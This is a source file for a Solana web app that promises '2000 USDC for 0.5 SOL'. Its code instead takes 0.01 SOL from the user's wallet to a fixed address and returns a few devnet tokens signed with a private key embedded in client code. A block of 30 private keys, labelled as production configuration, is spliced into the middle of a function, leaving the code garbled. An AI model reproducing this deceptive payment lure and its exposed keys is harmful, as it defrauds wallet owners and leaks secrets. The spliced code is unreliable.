/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5VGMjeGBFV3z2usA8y2LCsK8sFdsEWjAZVbexmvgZmMhn6sasmJ8qp53Pb8nC85DqwLZHg5wVNAkfnW6YXQpEfj9"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4Q6kSCCi5Ypwh8LEitD4sBFG7YGXg7uTXfjyXNJe8nQSbvZvo6YxcCNDkcwmNfxmt7SLeiZHj4WcufxboyMKDSE4",
  "key1": "5ZoUmHhvs1eAhGrdCUXsK23MGMYzMEsX43VQRP2ZkU9Qgq7yVzydKGKHFjKTdxrWt2QR3kKb3VGGFtm8qACp5wQx",
  "key2": "39Xq2dKsBKixRU1dnkMXQFYGujtZk2AiT44zHhrdrjr2iPRfDfnGYgZr3Kj3FVajRGr7sJWaXPHESMCHig8AxAx8",
  "key3": "4yMKv6H5ZN62S899Akk2ib1RutKbU1QP2PNUPrYniZQD3iPkPFV3qyJLRE1zPET4m87KJc3N72X7MigRvxncyyr7",
  "key4": "7TH4mVDGjRx4wY6vJ3s3GXHqpJzn5HwueQuFh3UpvQ1UVLb568wCQzrTT8mZDk3GrfEkdEhsqsYRqDL1LiucAzw",
  "key5": "5RchYFjQWr4cbQmbvFvLM58pi69kD8koyQJBhhTx7MHLjDkaAfw2onBVmQqwvE9uupUkzLEK48CCEGM72WX63ZZK",
  "key6": "tiwvB96Tu2GFwWuG2CN5smwxddMQkqSH4bpLxTR4ivo8mVpF1q8qFBGM9Catfu1FJGpbZJfer3TnKi7xPDpA2WE",
  "key7": "gehhdyaPe4pH28391YVNE9VXip9GKxpSf9JsvMmHMLY3AEeCrGtuzzja4ZR8ySqwdEYdyrKD7hLand9GSXHgzZ3",
  "key8": "3cG2B4zxj1y1nKDR9YEd5aPX5EbUHZsRnxzbsxw8CJ7HZu77FAD5f6WUAxSk1jN7HZSd1mj4ADrHYtThj2HKduSW",
  "key9": "4mnzsE4npfvcHJH2UXCXK1nMAtZKNLbQ1UWi9vPPBhwWLBNnTgw875wEkyv7g9xKcTCkUpvFcEjiHyEt7iR8qkXa",
  "key10": "5v5URgnSmhFAEywLWRi1WurK8fAhFJ7at6H1TfFcRdeuPBXAz9WbDud2qEAg9kpPpNXnt4AgiTiSQG7v2TUZsPBy",
  "key11": "4SbyqXiW4Ka9DRHkYNxRHgbU7q3v58AEF6r3RaHD6wvX2D4EHf24kjr52UPp2WYucb8tNTDmQSkqa2iv6ZMkGH8h",
  "key12": "MFrpfjHYKKbN6Rqo2pFzX61rxyLooczzrec8BBgCS4CbPk5a21oSPxzpJfsMJqfJDCATqnd7gTiNJ7D5NVtPudB",
  "key13": "Jrm4bppGjJyVMSEgfLKfGksDXcS4mWBzqHgmAHLuhc969BQfrPbobya49w2MH9E98eZerpTArFwk9WDUEqmxYcF",
  "key14": "4wD5X8m86748PsxRiMwBAEY2TeHGqABstBJVgL4DEcgpFP1i7cXrPSTmg8mHx9KguSVHZSrEaSad6ZunRBbucFg",
  "key15": "U17CuEtTGrbTZeTJTDSy8mqrUqTKSnhLbFvEbgYMdFxCZAXHHDM2Bhmv2oD2FWYUFWZkULQvCe1yZPHunB7SpDk",
  "key16": "22JaaQaWCy9KzsrFT7yc2Lw6Q5v71iu45hRUiWR4BrE4TCiYGoF6yF8ZrXjXgQe3QbdcGYKneqaDPx1No1j6Eczh",
  "key17": "5KedAGJDEWjrQtYnfv15JC7Ym4RY5kczja1iAzt5DKZ67JatWnELgsRCo2rZrMjBBb5fz85ptMtFkiXzb68Whn6f",
  "key18": "285Zy6AfJvqwqutdSwjtUSMrCi92mGW9Douymr8YqYGq5yexro3SWNmHq4TP1h5XxgQ8arBPT9cyFpqRX2wvYP9H",
  "key19": "23tHNczZShP13TeJavUXtRMPkqD3BUDcAT5NbCRi9nqvZ7vydG7jrV6jfdRn9GpNDrR4jCmvEiW4rDEvnXbW9mHX",
  "key20": "67qwrWxcEiDoHiHUY5mjqGqvFAseWxPDwBFjm1dMaf5AwzGXVrWbduGVM1JCAUVSACFDLL5EcFeqtFD8umo5fLj",
  "key21": "5MZHfJqZq2MzxNxWX7yTHQAkj5ST67Y8ijnLVkArWdpos5uF65VPAU418kiBVxTmMQyboKNwA8o7FcCdnGPKFfZg",
  "key22": "3jxgUT6wRQ5cRNnbbGmgWaXskgNQxvBA86v2cKeznkiy8hX4ftCHtetYm62jq9mgwBQAWYQ2zvhZJsWMFsQEFyyn",
  "key23": "14P5Frk4ajPqbjrSsCMSA1RYzyTeQQBpp22kygZs97SCGoBY77SXYVfBV5sYkhd3HjdBKWiDzQH3cmeM68Ji6vc",
  "key24": "5wMqHFY9DxGVZgbmcLqYCCnEYSf1BMszYTthgeCHK4nRQxv6xiW9bpuUHSEuE47ugjSzPjoJapJSMgfi9wnp8YYG",
  "key25": "3k2LAb9diYTksxmjQuRPXbLHzADnZ18jNNuRWWwfpcry8kWyv24yLeRwczqcy8bTbDZWXqVjbCfKFZFiWunhrU5Q",
  "key26": "48EZUxSSRsRc4JcBqPRbuBVA6VrY8VxkVugW4vMqPaJnFZT4wedZJVhVDUvE5FRYHe3EzgeMqA4h2eP5jRMk1qMJ",
  "key27": "57BfcVKLSPzGFZP2p7msUy1jiVkEbBamfDeRWtrBTJP753BYksNzEGV2poaXcpSHraRCLX6V1rxsj76u18cDALnt",
  "key28": "4HbBwpPZ9DjJYGpeaPJixfXyWWSKkTawzx7DRvkA4EmDppVdpmMjbJE2HN1GuPvEFVAkjSjUT41H2d9FR4ayvVeP",
  "key29": "RWP64x2LoemmW28ZvcH7SRFKG5UKcnDg325sQ9TXNFswWGvgDzRpjEL5PX1sCehjPdPPdv8s4mPVffWLcaMSxVs"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
